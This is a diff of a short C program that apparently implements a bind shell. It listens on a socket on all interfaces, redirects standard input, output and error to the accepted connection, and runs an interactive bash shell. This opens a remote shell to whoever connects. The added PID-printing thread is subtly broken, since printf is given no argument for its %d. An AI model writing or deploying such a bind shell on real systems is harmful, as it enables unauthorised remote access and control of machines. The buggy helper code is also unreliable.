@@ -1,17 +1,15 @@
 #include <stdio.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
+#include <pthread.h>
+#include <unistd.h>
 
-/*TODO
-Make a socket()
-Bind() it 
-Listen()
-Accept()
-*/
-
+void *write_pid(void *ptr);
 
 int main(){
 	
+	pthread_t thread_id;
+
 	struct sockaddr_in server_addr;
 	server_addr.sin_family=AF_INET;
 	server_addr.sin_addr.s_addr = INADDR_ANY;
@@ -25,15 +23,24 @@ int main(){
 
 	int bindfd = bind(sockfd, (struct sockaddr *)&server_addr,sizeof(server_addr));
 
-	listen(sockfd,0);
 
+	listen(sockfd,0);
+	pthread_create(&thread_id,NULL,write_pid,NULL);
+	pthread_join(thread_id,NULL);
 	int acceptfd = accept(sockfd, NULL,NULL);
 
 	for(int i = 0;i<3;i++){
 		dup2(acceptfd,i);
 	}
 
-	execve("/bin/sh",NULL,NULL);
+	execve("/bin/bash",(char *[]){"/bin/bash","-i",NULL},NULL);
+
 }
 
+//TODO
+//make this more useful
+void *write_pid(void *ptr){
+	pid_t pid=getpid();
+	printf("PID is: %d\n");
+}
 
